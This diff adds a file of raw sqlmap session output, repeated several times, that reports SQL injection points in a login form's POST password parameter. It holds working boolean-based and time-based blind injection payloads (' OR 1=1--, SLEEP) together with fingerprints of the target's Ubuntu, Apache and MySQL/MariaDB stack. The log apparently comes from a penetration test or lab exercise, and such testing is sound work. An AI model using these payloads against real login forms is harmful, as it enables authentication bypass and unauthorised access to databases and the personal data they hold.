@@ -1,0 +1,112 @@
+sqlmap identified the following injection point(s) with a total of 147 HTTP(s) requests:
+---
+Parameter: password (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=' OR 1=1--&password=' OR 1=1--' AND 1452=1452 AND 'xOnO'='xOnO
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: username=' OR 1=1--&password=' OR 1=1--' AND SLEEP(50) AND 'wIvu'='wIvu
+---
+web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: password (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=' OR 1=1--&password=' OR 1=1--' AND 1452=1452 AND 'xOnO'='xOnO
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: username=' OR 1=1--&password=' OR 1=1--' AND SLEEP(50) AND 'wIvu'='wIvu
+---
+web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 8.0.0 (MariaDB fork)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: password (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=' OR 1=1--&password=' OR 1=1--' AND 1452=1452 AND 'xOnO'='xOnO
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: username=' OR 1=1--&password=' OR 1=1--' AND SLEEP(50) AND 'wIvu'='wIvu
+---
+web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 8.0.0 (MariaDB fork)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: password (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=' OR 1=1--&password=' OR 1=1--' AND 1452=1452 AND 'xOnO'='xOnO
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: username=' OR 1=1--&password=' OR 1=1--' AND SLEEP(50) AND 'wIvu'='wIvu
+---
+web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 8.0.0 (MariaDB fork)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: password (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=' OR 1=1--&password=' OR 1=1--' AND 1452=1452 AND 'xOnO'='xOnO
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: username=' OR 1=1--&password=' OR 1=1--' AND SLEEP(50) AND 'wIvu'='wIvu
+---
+web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 8.0.0 (MariaDB fork)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: password (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=' OR 1=1--&password=' OR 1=1--' AND 1452=1452 AND 'xOnO'='xOnO
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: username=' OR 1=1--&password=' OR 1=1--' AND SLEEP(50) AND 'wIvu'='wIvu
+---
+web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 8.0.0 (MariaDB fork)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: password (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=' OR 1=1--&password=' OR 1=1--' AND 1452=1452 AND 'xOnO'='xOnO
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: username=' OR 1=1--&password=' OR 1=1--' AND SLEEP(50) AND 'wIvu'='wIvu
+---
+web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 8.0.0 (MariaDB fork)
+sqlmap identified the following injection point(s) with a total of 3575 HTTP(s) requests:
+---
+Parameter: password (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=' OR 1=1--&password=' OR 1=1--' AND 7188=7188 AND 'KizN'='KizN
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: username=' OR 1=1--&password=' OR 1=1--' AND SLEEP(5) AND 'cVEd'='cVEd
+---
+web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
